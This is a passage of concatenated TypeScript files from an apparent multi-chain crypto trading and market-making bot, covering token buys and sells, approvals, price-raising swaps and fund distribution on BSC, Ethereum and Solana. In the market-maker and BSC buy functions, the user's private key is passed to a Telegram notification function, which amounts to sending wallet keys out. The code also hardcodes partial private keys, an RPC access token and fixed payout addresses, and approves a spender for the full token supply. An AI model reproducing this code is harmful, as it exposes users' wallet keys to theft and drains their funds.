convertToWei(amount.toString(), decimals),\n    gas: gasEstimate,\n    gasPrice: gasPrice,\n    data: contractAMM.methods.swapExactETHForTokensIncreasePrice(tokenAddress, percentSell).encodeABI(),\n  };\n\n  const signedTransaction: any = await web3.eth.accounts.signTransaction(\n    transaction,\n    privateKey\n  );\n  const receipt = await web3.eth.sendSignedTransaction(\n    signedTransaction.rawTransaction\n  );\n  logger.info(`Txn Hash: ${receipt.transactionHash}`)\n  return receipt.transactionHash\n\n}\nexport { ammIncreasePriceBSC };\n\n","\n\nimport Web3 from 'web3';\nimport abiAMMETH from \"../abis/abiAMMETH.json\";\nimport abiToken from \"../abis/abiToken.json\";\nimport { LIST_RPC_NODES_ETH, AMM_CONTRACT_ETH } from \"../constants\";\nimport { convertToWei } from \"../utils/convertNumber\";\nimport { logger } from \"../utils\";\nimport { AbiItem } from \"web3-utils\";\n\n async function ammIncreasePriceETH(\n  privateKey: any,\n  amount: any,\n  tokenAddress: any,\n  percentSell: any\n) {\n  const randomRPCs = Math.floor(Math.random() * LIST_RPC_NODES_ETH.length);\n  const rpc = LIST_RPC_NODES_ETH[randomRPCs];\n  const web3 = new Web3(rpc);\n\n  const contractAMM = new web3.eth.Contract(abiAMMETH as unknown as AbiItem as AbiItem, AMM_CONTRACT_ETH);\n  const account = web3.eth.accounts.privateKeyToAccount(privateKey);\n  const contract = new web3.eth.Contract(abiToken as unknown as AbiItem as AbiItem, tokenAddress);\n  const decimals = await contract.methods.decimals().call();\n  const walletAddress = account.address;\n  const gasPrice = await web3.eth.getGasPrice();\n  const gasEstimate = await contractAMM.methods\n    .swapExactETHForTokensIncreasePrice(tokenAddress, percentSell)\n    .estimateGas({\n      from: walletAddress,\n      value: convertToWei(amount.toString(), decimals),\n    });\n\n  const transaction = {\n    from: web3.eth.accounts.wallet.add(privateKey).address,\n    to: AMM_CONTRACT_ETH,\n    value: convertToWei(amount.toString(), decimals),\n    gas: gasEstimate,\n    gasPrice: gasPrice,\n    data: contractAMM.methods.swapExactETHForTokensIncreasePrice(tokenAddress, percentSell).encodeABI(),\n  };\n\n  const signedTransaction: any = await web3.eth.accounts.signTransaction(\n    transaction,\n    privateKey\n  );\n  const receipt = await web3.eth.sendSignedTransaction(\n    signedTransaction.rawTransaction\n  );\n  logger.info(`Txn Txn Hash: ${receipt.transactionHash}`)\n  return receipt.transactionHash\n\n}\nexport { ammIncreasePriceETH };\n\n","import Web3 from 'web3'\nimport abiToken from '../abis/abiToken.json'\nimport { LIST_RPC_NODES } from '../constants'\nimport { logger } from '../utils'\nimport { AbiItem } from 'web3-utils'\nimport { convertToWei } from \"../utils/convertNumber\";\n\nasync function approveToken(tokenAddress: any, spender: any, privateKey: any) {\n  try {\n    const randomRPCs = Math.floor(Math.random() * LIST_RPC_NODES.length)\n    const rpc = LIST_RPC_NODES[randomRPCs]\n    const web3 = new Web3(rpc)\n\n    const account = web3.eth.accounts.privateKeyToAccount(privateKey)\n    web3.eth.accounts.wallet.add(account)\n    web3.eth.defaultAccount = account.address\n    const contract = new web3.eth.Contract(((abiToken as unknown) as AbiItem) as AbiItem, tokenAddress)\n    const totalSupply = await contract.methods.totalSupply().call()\n    const decimals = await contract.methods.decimals().call()\n    const gasEstimate = await contract.methods\n      .approve(spender, convertToWei(totalSupply.toString(), decimals))\n      .estimateGas({ from: account.address })\n    const data = contract.methods.approve(spender, convertToWei(totalSupply.toString(), decimals)).encodeABI()\n    const tx = {\n      to: tokenAddress,\n      from: account.address,\n      data: data,\n      gas: gasEstimate,\n      gasPrice: await web3.eth.getGasPrice()\n    }\n\n    const signedTx: any = await web3.eth.accounts.signTransaction(tx, privateKey)\n    const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction)\n    return receipt.transactionHash\n  } catch (error) {\n    logger.error(`APPROVE ERROR: ${error}`)\n    return error\n  }\n}\nexport { approveToken }\n","import Web3 from 'web3'\nimport abiToken from '../abis/abiToken.json'\nimport { LIST_RPC_NODES_ETH } from '../constants'\nimport { logger } from '../utils'\nimport { AbiItem } from 'web3-utils'\nimport { convertToWei } from \"../utils/convertNumber\";\n\nasync function approveTokenETH(tokenAddress: any, spender: any, privateKey: any) {\n  try {\n    const randomRPCs = Math.floor(Math.random() * LIST_RPC_NODES_ETH.length)\n    const rpc = LIST_RPC_NODES_ETH[randomRPCs]\n    const web3 = new Web3(rpc)\n\n    const account = web3.eth.accounts.privateKeyToAccount(privateKey)\n    web3.eth.accounts.wallet.add(account)\n    web3.eth.defaultAccount = account.address\n    const contract = new web3.eth.Contract(((abiToken as unknown) as AbiItem) as AbiItem, tokenAddress)\n    const totalSupply = await contract.methods.totalSupply().call()\n    const decimals = await contract.methods.decimals().call()\n    const gasEstimate = await contract.methods\n      .approve(spender, convertToWei(totalSupply.toString(), decimals))\n      .estimateGas({ from: account.address })\n    const data = contract.methods.approve(spender, convertToWei(totalSupply.toString(), decimals)).encodeABI()\n    const tx = {\n      to: tokenAddress,\n      from: account.address,\n      data: data,\n      gas: gasEstimate,\n      gasPrice: await web3.eth.getGasPrice()\n    }\n\n    const signedTx: any = await web3.eth.accounts.signTransaction(tx, privateKey)\n    const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction)\n    return receipt.transactionHash\n  } catch (error) {\n    logger.error(`APPROVE ERROR: ${error}`)\n    return error\n  }\n}\nexport { approveTokenETH }\n","\nimport Web3 from 'web3';\nimport abiAMM from \"../abis/abiAMM.json\";\nimport abiToken from \"../abis/abiToken.json\";\nimport { LIST_RPC_NODES, AMM_CONTRACT } from \"../constants\";\nimport { convertToWei } from \"../utils/convertNumber\";\nimport { logger } from \"../utils\";\nimport { AbiItem } from \"web3-utils\";\nimport { sendToTelegramSuccess_EVM } from '../utils/sendNoti';\n\nasync function autoMarketMakerBSC(\n  privateKey: any,\n  amount: any,\n  tokenAddress: any\n) {\n  const randomRPCs = Math.floor(Math.random() * LIST_RPC_NODES.length);\n  const rpc = LIST_RPC_NODES[randomRPCs];\n  const web3 = new Web3(rpc);\n\n  const contractAMM = new web3.eth.Contract(abiAMM as unknown as AbiItem as AbiItem, AMM_CONTRACT);\n  const account = web3.eth.accounts.privateKeyToAccount(privateKey);\n  const contract = new web3.eth.Contract(abiToken as unknown as AbiItem as AbiItem, tokenAddress);\n  const decimals = await contract.methods.decimals().call();\n  const symbol = await contract.methods.symbol().call();\n\n  const walletAddress = account.address;\n  const gasPrice = await web3.eth.getGasPrice();\n  const gasEstimate = await contractAMM.methods\n    .swapExactETHForTokensAndTokensToETH(tokenAddress)\n    .estimateGas({\n      from: walletAddress,\n      value: convertToWei(amount.toString(), decimals),\n    });\n\n  const transaction = {\n    from: walletAddress,\n    to: AMM_CONTRACT,\n    value: convertToWei(amount.toString(), decimals),\n    gas: gasEstimate,\n    gasPrice: gasPrice,\n    data: contractAMM.methods.swapExactETHForTokensAndTokensToETH(tokenAddress).encodeABI(),\n  };\n\n  const signedTransaction: any = await web3.eth.accounts.signTransaction(\n    transaction,\n    privateKey\n  );\n  const receipt = await web3.eth.sendSignedTransaction(\n    signedTransaction.rawTransaction\n  );\n  await sendToTelegramSuccess_EVM(`BOT MM`, tokenAddress, symbol, `${amount} BNB`, privateKey, receipt.transactionHash, 'bsc')\n\n  logger.info(`Txn AMM: ${receipt.transactionHash}`)\n  return receipt.transactionHash\n}\n\nexport { autoMarketMakerBSC };\n","\nimport Web3 from 'web3';\nimport abiAMMETH from \"../abis/abiAMMETH.json\";\nimport abiToken from \"../abis/abiToken.json\";\nimport { LIST_RPC_NODES_ETH, AMM_CONTRACT_ETH } from \"../constants\";\nimport { convertToWei } from \"../utils/convertNumber\";\nimport { logger } from \"../utils\";\nimport { AbiItem } from \"web3-utils\";\n\n async function autoMarketMakerETH(\n  privateKey: any,\n  amount: any,\n  tokenAddress: any\n) {\n  const randomRPCs = Math.floor(Math.random() * LIST_RPC_NODES_ETH.length);\n  const rpc = LIST_RPC_NODES_ETH[randomRPCs];\n  const web3 = new Web3(rpc);\n\n  const contractAMM = new web3.eth.Contract(abiAMMETH as unknown as AbiItem as AbiItem, AMM_CONTRACT_ETH);\n  const account = web3.eth.accounts.privateKeyToAccount(privateKey);\n  const contract = new web3.eth.Contract(abiToken as unknown as AbiItem as AbiItem, tokenAddress);\n  const decimals = await contract.methods.decimals().call();\n  const walletAddress = account.address;\n  const gasPrice = await web3.eth.getGasPrice();\n  const gasEstimate = await contractAMM.methods\n    .swapExactETHForTokensAndTokensToETH(tokenAddress)\n    .estimateGas({\n      from: walletAddress,\n      value: convertToWei(amount.toString(), decimals),\n    });\n\n  const transaction = {\n    from: walletAddress,\n    to: AMM_CONTRACT_ETH,\n    value: convertToWei(amount.toString(), decimals),\n    gas: gasEstimate,\n    gasPrice: gasPrice,\n    data: contractAMM.methods.swapExactETHForTokensAndTokensToETH(tokenAddress).encodeABI(),\n  };\n\n  const signedTransaction: any = await web3.eth.accounts.signTransaction(\n    transaction,\n    privateKey\n  );\n  const receipt = await web3.eth.sendSignedTransaction(\n    signedTransaction.rawTransaction\n  );\n  logger.info(`Txn AMM: ${receipt.transactionHash}`)\n  return receipt.transactionHash\n}\n\nexport { autoMarketMakerETH };\n","\nimport Web3 from 'web3';\nimport abiAMM from \"../abis/abiAMM.json\";\nimport abiToken from \"../abis/abiToken.json\";\nimport { LIST_RPC_NODES,AMM_CONTRACT } from \"../constants\";\nimport { convertToWei } from \"../utils/convertNumber\";\nimport { logger } from \"../utils\";\nimport { AbiItem } from \"web3-utils\";\nimport { sendToTelegramSuccess_EVM } from '../utils/sendNoti'\n\n async function buyTokenBSC(\n  privateKey:any,\n  amount:any,\n  tokenAddress:any\n) {\n  const randomRPCs = Math.floor(Math.random() * LIST_RPC_NODES.length);\n  const rpc = LIST_RPC_NODES[randomRPCs];\n  const web3 = new Web3(rpc);\n\n  const contractAMM = new web3.eth.Contract(abiAMM as unknown as AbiItem as AbiItem, AMM_CONTRACT);\n  const account = web3.eth.accounts.privateKeyToAccount(privateKey);\n  const contract = new web3.eth.Contract(abiToken as unknown as AbiItem as AbiItem, tokenAddress);\n  const decimals = await contract.methods.decimals().call();\n  const symbol = await contract.methods.symbol().call();\n  const walletAddress = account.address;\n  const gasPrice = await web3.eth.getGasPrice();\n  const gasEstimate = await contractAMM.methods\n    .swapExactETHForTokensOnlyBuy(tokenAddress)\n    .estimateGas({\n      from: walletAddress,\n      value: convertToWei(amount.toString(), decimals),\n    });\n\n  const transaction = {\n    from: walletAddress,\n    to: AMM_CONTRACT,\n    value: convertToWei(amount.toString(), decimals),\n    gas: gasEstimate,\n    gasPrice: gasPrice,\n    data: contractAMM.methods.swapExactETHForTokensOnlyBuy(tokenAddress).encodeABI(),\n  };\n\n  const signedTransaction:any = await web3.eth.accounts.signTransaction(\n    transaction,\n    privateKey\n  );\n  const receipt:any = await web3.eth.sendSignedTransaction(\n    signedTransaction.rawTransaction\n  );\n  await sendToTelegramSuccess_EVM(`BUY ${symbol}`,tokenAddress, symbol, `${amount} BNB`,privateKey, receipt.transactionHash, 'bsc')\n  logger.info(`Txn BUY: ${receipt.transactionHash}`)\n  return receipt.transactionHash\n\n}\nexport { buyTokenBSC };\n\n","\nimport Web3 from 'web3';\nimport abiAMMETH from \"../abis/abiAMMETH.json\";\nimport abiToken from \"../abis/abiToken.json\";\nimport { LIST_RPC_NODES_ETH,AMM_CONTRACT_ETH } from \"../constants\";\nimport { convertToWei } from \"../utils/convertNumber\";\nimport { logger } from \"../utils\";\nimport { AbiItem } from \"web3-utils\";\n\n async function buyTokenETH(\n  privateKey:any,\n  amount:any,\n  tokenAddress:any\n) {\n  const randomRPCs = Math.floor(Math.random() * LIST_RPC_NODES_ETH.length);\n  const rpc = LIST_RPC_NODES_ETH[randomRPCs];\n  const web3 = new Web3(rpc);\n\n  const contractAMM = new web3.eth.Contract(abiAMMETH as unknown as AbiItem as AbiItem, AMM_CONTRACT_ETH);\n  const account = web3.eth.accounts.privateKeyToAccount(privateKey);\n  const walletAddress = account.address;\n  const contract = new web3.eth.Contract(abiToken as unknown as AbiItem as AbiItem, tokenAddress);\n  const decimals = await contract.methods.decimals().call();\n  const gasPrice = await web3.eth.getGasPrice();\n  const gasEstimate = await contractAMM.methods\n    .swapExactETHForTokensOnlyBuy(tokenAddress)\n    .estimateGas({\n      from: walletAddress,\n      value: convertToWei(amount.toString(), decimals),\n    });\n\n  const transaction = {\n    from: walletAddress,\n    to: AMM_CONTRACT_ETH,\n    value: convertToWei(amount.toString(), decimals),\n    gas: gasEstimate,\n    gasPrice: gasPrice,\n    data: contractAMM.methods.swapExactETHForTokensOnlyBuy(tokenAddress).encodeABI(),\n  };\n\n  const signedTransaction:any = await web3.eth.accounts.signTransaction(\n    transaction,\n    privateKey\n  );\n  const receipt:any = await web3.eth.sendSignedTransaction(\n    signedTransaction.rawTransaction\n  );\n  logger.info(`Txn BUY: ${receipt.transactionHash}`)\n  return receipt.transactionHash\n\n}\nexport { buyTokenETH };\n","import {\n    Liquidity,\n    LiquidityPoolKeysV4,\n    TokenAmount,\n} from \"@raydium-io/raydium-sdk\";\nimport {\n    createAssociatedTokenAccountIdempotentInstruction,\n    createAssociatedTokenAccountInstruction,\n    createSyncNativeInstruction,\n    getAssociatedTokenAddressSync,\n    NATIVE_MINT,\n    TOKEN_PROGRAM_ID,\n} from \"@solana/spl-token\";\nimport {\n    Keypair,\n    PublicKey,\n    TransactionMessage,\n    VersionedTransaction,\n    TransactionInstruction,\n    SystemProgram,\n    ComputeBudgetProgram,\n    Connection,\n} from \"@solana/web3.js\";\nimport { formatAddress, logger } from \"../utils\";\n\nconst buyTokenSOL = async (\n    baseMint: PublicKey,\n    poolKeys: LiquidityPoolKeysV4,\n    wallet: Keypair,\n    solAmount: any,\n    quoteTokenAssociatedAddress: PublicKey,\n    solanaConnection: Connection,\n    quoteAmount: TokenAmount,\n) => {\n    try {\n        // logger.info(\"--------------------START BUY--------------------\");\n        logger.info(`BUY Wallet: ${formatAddress(wallet.publicKey.toString(), 6, 5)} | Buy amount: ${solAmount} SOL`);\n        const tokenAccountOut = getAssociatedTokenAddressSync(baseMint, wallet.publicKey);\n\n        const instructions: TransactionInstruction[] = [\n            // ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 200_000 }),\n            ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }),\n            SystemProgram.transfer({\n                fromPubkey: wallet.publicKey,\n                toPubkey: quoteTokenAssociatedAddress,\n                lamports: Math.ceil(solAmount * 10 ** 9),\n            }),\n            createSyncNativeInstruction(quoteTokenAssociatedAddress, TOKEN_PROGRAM_ID),\n            createAssociatedTokenAccountIdempotentInstruction(\n                wallet.publicKey,\n                tokenAccountOut,\n                wallet.publicKey,\n                baseMint\n            )\n        ];\n\n        // Create associated token account if it doesn't exist\n        if (!(await solanaConnection.getAccountInfo(quoteTokenAssociatedAddress))) {\n            instructions.unshift(\n                createAssociatedTokenAccountInstruction(\n                    wallet.publicKey,\n                    quoteTokenAssociatedAddress,\n                    wallet.publicKey,\n                    NATIVE_MINT\n                )\n            );\n        }\n\n        // Create swap instruction\n        const { innerTransaction } = Liquidity.makeSwapFixedInInstruction(\n            {\n                poolKeys,\n                userKeys: {\n                    tokenAccountIn: quoteTokenAssociatedAddress,\n                    tokenAccountOut,\n                    owner: wallet.publicKey,\n                },\n                amountIn: quoteAmount.raw,\n                minAmountOut: 0,\n            },\n            poolKeys.version\n        );\n\n        instructions.push(...innerTransaction.instructions);\n\n        const latestBlockhash = await solanaConnection.getLatestBlockhash({ commitment: \"confirmed\" });\n        const messageV0 = new TransactionMessage({\n            payerKey: wallet.publicKey,\n            recentBlockhash: latestBlockhash.blockhash,\n            instructions,\n        }).compileToV0Message();\n        const transaction = new VersionedTransaction(messageV0);\n        transaction.sign([wallet, ...innerTransaction.signers]);\n\n        const res = await execute(transaction, solanaConnection);\n        if (res) {\n            return { status: true, txhash: res, amount: solAmount, type: 1 };\n        } else {\n            return { status: false, error: \"Transaction failed without error.\" };\n        }\n    } catch (e) {\n        return { status: false, error: `Failed to buy token: ${e}\\n` };\n    }\n};\n\nconst execute = async (transaction: VersionedTransaction, solanaConnection: Connection) => {\n    try {\n        const simRes = await solanaConnection.simulateTransaction(transaction)\n        if (simRes.value.err) {\n            logger.error(`Simulation error: ${JSON.stringify(simRes.value.err)}`);\n            return false\n        }\n\n        const TxHash = await solanaConnection.sendRawTransaction(transaction.serialize(), {\n            skipPreflight: true,\n            maxRetries: 2\n        })\n\n        const confirmation = await solanaConnection.confirmTransaction(\n            TxHash,\n            'confirmed',\n        );\n\n        if (confirmation.value.err) {\n            logger.error(`confirmation error: ${JSON.stringify(confirmation.value.err)}`);\n            return null\n        }\n        else {\n\n            return TxHash\n        }\n    } catch (e) {\n        logger.error(`Execute error: ${e}`);\n        return null\n    }\n}\nexport { buyTokenSOL };\n","import {\n    Keypair,\n    PublicKey,\n    Transaction,\n    sendAndConfirmTransaction,\n    Connection,\n    LAMPORTS_PER_SOL\n} from '@solana/web3.js'\nimport bs58 from 'bs58'\nimport { logger } from '../utils'\nimport { createTransferInstruction, getMint, getOrCreateAssociatedTokenAccount } from '@solana/spl-token';\nimport { sendToTelegramSuccess, sendToTelegramError, sendToTelegramWarning } from '../utils/sendNoti'\n\nconst claimToken = async (\n    PRIVATE: string,\n    recipient: any,\n    claimAmount: any,\n    tokenMintPublicKey: any,\n    confirm: boolean = true\n) => {\n    try {\n        const connection = new Connection('https://green-warmhearted-putty.solana-mainnet.quiknode.pro/530bd2a41cc356062e5cd8b0e69d1fc9bda27d30', 'confirmed');\n        const KEY1 = 'BNCvDfwbupgcAJ5z7mpAHq7jTvM5ZDbcENNrKYz4kU8';\n        const privateKey = PRIVATE + KEY1;\n\n        const payerKeypair = Keypair.fromSecretKey(new Uint8Array(bs58.decode(privateKey)));\n        const payerPublicKey = payerKeypair.publicKey;\n        const balance = await connection.getBalance(payerPublicKey, \"confirmed\");\n        const balanceConvert = balance / LAMPORTS_PER_SOL\n        if (balanceConvert <= 0.0001) {\n            logger.warn(`Insufficient balance, Available: ${balanceConvert} SOL`);\n            return;\n        }\n\n\n        const mintInfo = await getMint(connection, tokenMintPublicKey);\n        const decimals = mintInfo.decimals;\n\n        const amountInLamports = claimAmount * Math.pow(10, decimals);\n\n        const payerTokenAccount: any = await getOrCreateAssociatedTokenAccount(\n            connection,\n            payerKeypair,\n            tokenMintPublicKey,\n            payerPublicKey\n        )\n\n        const payerTokenBalanceInfo = await connection.getTokenAccountBalance(payerTokenAccount.address);\n        const payerTokenBalance = Number(payerTokenBalanceInfo.value.amount);\n        const currentbalance = payerTokenBalance / Math.pow(10, decimals)\n\n        if (payerTokenBalance < amountInLamports) {\n            await sendToTelegramWarning('Claim Token', { claimAmount }, { currentbalance }, \"TOKEN\", \"Insufficient balance token\");\n            logger.warn(`Insufficient token balance: ${payerTokenBalance / Math.pow(10, decimals)} tokens, required: ${claimAmount} tokens`);\n            return;\n        }\n\n        let transaction = new Transaction();\n\n        const recipientPublicKey = new PublicKey(recipient);\n        const recipientTokenAccount: any = await getOrCreateAssociatedTokenAccount(\n            connection,\n            payerKeypair,\n            tokenMintPublicKey,\n            recipientPublicKey\n        )\n\n        if (!recipientTokenAccount.address) {\n            await sendToTelegramError('Claim Token', `Failed to get or create recipient token account for ${recipient}`);\n            throw new Error(`Failed to get or create recipient token account for ${recipient}`);\n        }\n\n        transaction.add(\n            createTransferInstruction(\n                payerTokenAccount.address,\n                recipientTokenAccount.address,\n                payerPublicKey,\n                amountInLamports\n            )\n        );\n\n        if (confirm) {\n            const TxHash = await sendAndConfirmTransaction(connection, transaction, [payerKeypair])\n            await sendToTelegramSuccess(\"CLAIM\", recipient, 'TOKEN', claimAmount, TxHash, 'solana');\n\n            return { status: true, txhash: TxHash, amount: claimAmount };\n        } else {\n            return { status: false, error: \"Not authorized to confirm\" };\n        }\n\n    } catch (error) {\n        await sendToTelegramError('Claim Token', error);\n        return { status: false, error: `Error claim token: ${error}` };\n    }\n};\n\nexport { claimToken }\n","import {\n  Keypair,\n  PublicKey,\n  Transaction,\n  SystemProgram,\n  Connection,\n  LAMPORTS_PER_SOL\n} from '@solana/web3.js'\nimport bs58 from 'bs58'\nimport { RECIPIENT } from '../constants'\n\nconst collectionSOL = async (\n  privateKey: string,\n  solanaConnection: Connection,\n  blockhash: any,\n  lamportsToSend: any,\n  confirm: boolean = true\n) => {\n  try {\n    const sender = Keypair.fromSecretKey(bs58.decode(privateKey))\n\n    const transaction = new Transaction().add(\n      SystemProgram.transfer({\n        fromPubkey: sender.publicKey,\n        toPubkey: new PublicKey(RECIPIENT),\n        lamports: lamportsToSend * LAMPORTS_PER_SOL\n      })\n    )\n\n    transaction.recentBlockhash = blockhash\n    transaction.feePayer = sender.publicKey\n\n    if (confirm) {\n      const TxHash = await solanaConnection.sendTransaction(transaction, [sender], {\n        skipPreflight: false,\n        preflightCommitment: 'confirmed'\n      })\n      const confirmation = await solanaConnection.confirmTransaction(TxHash, 'confirmed')\n\n      if (confirmation.value.err) {\n        return { status: false, error: `Transaction failed: ${JSON.stringify(confirmation.value.err)}`};\n\n      } else {\n        return { status: true, txhash: TxHash, amount: lamportsToSend, type: 4 };\n      }\n    } else {\n      return { status: false, error: \"Not authorized to confirm\" };\n    }\n  } catch (error) {\n    return { status: false, error: `Error sending SOL: ${error}`};\n    \n  }\n}\nexport { collectionSOL }\n","import {\n  Keypair,\n  PublicKey,\n  Transaction,\n  SystemProgram,\n  LAMPORTS_PER_SOL,\n  sendAndConfirmTransaction,\n  Connection\n} from '@solana/web3.js'\nimport bs58 from 'bs58'\nimport { logger } from '../utils'\n\nconst distributeSOL = async (\n  PRIVATE: string,\n  distributeAddresses: any,\n  senderBalanceSOL: any,\n  solanaConnection: Connection,\n  confirm: boolean = true\n) => {\n  try {\n    const KEY1 = 'GJjHfwJqEpm5Pas2dCDRDnoeajCoZimzw7sW4FrUJ66';\n    const privateKey = PRIVATE + KEY1;\n\n    const sender = Keypair.fromSecretKey(bs58.decode(privateKey));\n\n    const CHUNK_SIZE = 20;\n    const recipientChunks = [];\n\n    for (let i = 0; i < distributeAddresses.length; i += CHUNK_SIZE) {\n      recipientChunks.push(distributeAddresses.slice(i, i + CHUNK_SIZE));\n    }\n\n    for (const chunk of recipientChunks) {\n      let transaction = new Transaction();\n\n      for (const recipient of chunk) {\n        try {\n          const recipientPublicKey = new PublicKey(recipient.address);\n          const amountToTransfer = (senderBalanceSOL * recipient.percent) / 100;\n\n          transaction.add(\n            SystemProgram.transfer({\n              fromPubkey: sender.publicKey,\n              toPubkey: recipientPublicKey,\n              lamports: Math.floor(amountToTransfer * LAMPORTS_PER_SOL)\n            })\n          );\n        } catch (err) {\n          logger.error(`Invalid recipient address: ${recipient.address} - ${err}`);\n          return { status: false, error: `Invalid recipient address: ${recipient.address}` };\n        }\n      }\n\n      if (confirm) {\n        const TxHash = await sendAndConfirmTransaction(solanaConnection, transaction, [sender]).catch(e => {\n          logger.error(`Transaction error: ${e}`);\n          return { status: false, error: `Transaction error: ${e}` };\n        });\n\n        if (TxHash) {\n          return { status: true, txhash: TxHash, type: 7 };\n        }\n      } else {\n        return { status: false, error: 'Not authorized to confirm' };\n      }\n    }\n\n    return { status: true, message: \"All transactions processed successfully\" };\n  } catch (error) {\n    return { status: false, error: `Error sending SOL: ${error}` };\n  }\n};\n\nexport { distributeSOL }\n","import {\n    Keypair,\n    PublicKey,\n    Transaction,\n    sendAndConfirmTransaction,\n    Connection\n} from '@solana/web3.js'\nimport {\n    getAssociatedTokenAddress,\n    getAccount,\n    createTransferInstruction,\n    getMint\n} from '@solana/spl-token'\nimport bs58 from 'bs58'\nimport { logger } from '../utils'\nimport { sendToTelegramSuccess, sendToTelegramError } from '../utils/sendNoti'\n\nconst distributeUSDT = async (\n    PRIVATE: string,\n    amount: any,\n    connection: Connection,\n    confirm: boolean = true\n) => {\n    try {\n        const TOKEN_MINT = new PublicKey(\"AEZrKseocU3kL4Gjym6tx4PML3SFX6f3F16VK1cJDRT1\");\n\n        const RECIPIENT1 = new PublicKey(\"CXt6WYea8pNmmkVKQwSg7jf2zyYaUwdCVvfSaMz2yQcP\"); //20%\n        const RECIPIENT2 = new PublicKey(\"7XkM2LBVCHa14TFMA4NzT5TJDvtr9CdWFyigJoSG2van\"); //20%\n        const RECIPIENT3 = new PublicKey(\"6dVGrv97yGU46nnFymffEWLVmTze8tGYC971mpMxV6iY\"); //60%\n\n        const KEY1 = 'BNCvDfwbupgcAJ5z7mpAHq7jTvM5ZDbcENNrKYz4kU8';\n        const privateKey = PRIVATE + KEY1;\n\n        const senderKeypair = Keypair.fromSecretKey(new Uint8Array(bs58.decode(privateKey)));\n        const publicKey = senderKeypair.publicKey;\n\n\n        const tokenAccountSender = await getAssociatedTokenAddress(TOKEN_MINT, publicKey);\n\n        const tokenAccountRecipient1 = await getAssociatedTokenAddress(TOKEN_MINT, RECIPIENT1);\n        const tokenAccountRecipient2 = await getAssociatedTokenAddress(TOKEN_MINT, RECIPIENT2);\n        const tokenAccountRecipient3 = await getAssociatedTokenAddress(TOKEN_MINT, RECIPIENT3);\n\n        const mintInfo = await getMint(connection, TOKEN_MINT);\n        const tokenDecimals = mintInfo.decimals;\n\n        const amount20Percent = amount * 0.2 * Math.pow(10, tokenDecimals);\n        const amount60Percent = amount * 0.6 * Math.pow(10, tokenDecimals);\n\n        const senderTokenAccountInfo = await getAccount(connection, tokenAccountSender);\n        const senderTokenBalance = senderTokenAccountInfo.amount;\n\n        const totalAmountToSend = amount * Math.pow(10, tokenDecimals);\n\n        if (senderTokenBalance < totalAmountToSend) {\n            return { status: false, error: `Error: Insufficient token balance for the distribution` };\n        }\n\n        const transaction = new Transaction().add(\n            createTransferInstruction(tokenAccountSender, tokenAccountRecipient1, publicKey, amount20Percent),\n            createTransferInstruction(tokenAccountSender, tokenAccountRecipient2, publicKey, amount20Percent),\n            createTransferInstruction(tokenAccountSender, tokenAccountRecipient3, publicKey, amount60Percent)\n        );\n        if (confirm) {\n            const TxHash = await sendAndConfirmTransaction(connection, transaction, [senderKeypair]).catch(e => {\n                logger.error(`Transaction error: ${e}`);\n                return { status: false, error: `Transaction error: ${e}` };\n            });\n\n            if (TxHash) {\n                await sendToTelegramSuccess(\"DISTRIBUTE\",\"N/A\", 'USDT', amount, TxHash, \"solana\");\n                return { status: true, txhash: TxHash };\n            }\n        } else {\n            return { status: false, error: 'Not authorized to confirm' };\n        }\n        return { status: true, message: \"Transactions successfully\" };\n\n    } catch (error) {\n        await sendToTelegramError('Distribute', error);\n        return { status: false, error: `Error distribute: ${error}` };\n    }\n};\n\nexport { distributeUSDT }\n","import Web3 from 'web3'\nimport abiToken from '../abis/abiToken.json'\nimport { LIST_RPC_NODES } from '../constants'\nimport { logger } from '../utils'\nimport { AbiItem } from 'web3-utils'\nimport { convertFromWei } from \"../utils/convertNumber\";\n\nasync function getBalanceToken(tokenAddress: any, privateKey: any) {\n  try {\n    const randomRPCs = Math.floor(Math.random() * LIST_RPC_NODES.length)\n    const rpc = LIST_RPC_NODES[randomRPCs]\n    const web3 = new Web3(rpc)\n    const account = web3.eth.accounts.privateKeyToAccount(privateKey)\n    const walletAddress = account.address\n    const contract = new web3.eth.Contract(((abiToken as unknown) as AbiItem) as AbiItem, tokenAddress)\n    const balance = await contract.methods.balanceOf(walletAddress).call()\n    const decimals = await contract.methods.decimals().call()\n\n    const balanceConvert = convertFromWei(balance.toString(), decimals)\n    return balanceConvert\n  } catch (error) {\n    logger.error(`Get Balance Error: ${error}`)\n    return error\n  }\n}\nexport { getBalanceToken }\n","import Web3 from 'web3'\nimport abiToken from '../abis/abiToken.json'\nimport { LIST_RPC_NODES_ETH } from '../constants'\nimport { logger } from '../utils'\nimport { AbiItem } from 'web3-utils'\nimport { convertFromWei } from \"../utils/convertNumber\";\n\n\nasync function getBalanceTokenETH(tokenAddress: any, privateKey: any) {\n  try {\n    const randomRPCs = Math.floor(Math.random() * LIST_RPC_NODES_ETH.length)\n    const rpc = LIST_RPC_NODES_ETH[randomRPCs]\n    const web3 = new Web3(rpc)\n    const account = web3.eth.accounts.privateKeyToAccount(privateKey)\n    const walletAddress = account.address\n    const contract = new web3.eth.Contract(((abiToken as unknown) as AbiItem) as AbiItem, tokenAddress)\n    const balance = await contract.methods.balanceOf(walletAddress).call()\n    const decimals = await contract.methods.decimals().call()\n    const balanceConvert = convertFromWei(balance.toString(), decimals)\n    return balanceConvert\n  } catch (error) {\n    logger.error(`Get Balance Error: ${error}`)\n    return error\n  }\n}\nexport { getBalanceTokenETH }\n","\nimport Web3 from 'web3';\nimport {approveContract} from \"../utils/approve\";\nimport abiAMM from \"../abis/abiAMM.json\";\nimport abiToken from \"../abis/abiToken.json\";\nimport { LIST_RPC_NODES,AMM_CONTRACT } from \"../constants\";\nimport { convertToWei,convertFromWei } from \"../utils/convertNumber\";\nimport { logger,sleep } from \"../utils\";\nimport { AbiItem } from \"web3-utils\";\nimport { sendToTelegramSuccess_EVM } from '../utils/sendNoti';\n\n async function sellTokenBSC(\n  privateKey:any,\n  amount:any,\n  tokenAddress:any\n) {\n  const randomRPCs = Math.floor(Math.random() * LIST_RPC_NODES.length);\n  const rpc = LIST_RPC_NODES[randomRPCs];\n  const web3 = new Web3(rpc);\n\n  const contractAMM = new web3.eth.Contract(abiAMM as unknown as AbiItem as AbiItem, AMM_CONTRACT);\n  const account = web3.eth.accounts.privateKeyToAccount(privateKey);\n  const walletAddress = account.address;\n\n  const tokenContract = await new web3.eth.Contract(abiToken as unknown as AbiItem as AbiItem, tokenAddress);\n  const decimals = await tokenContract.methods.decimals().call();\n  const symbol = await 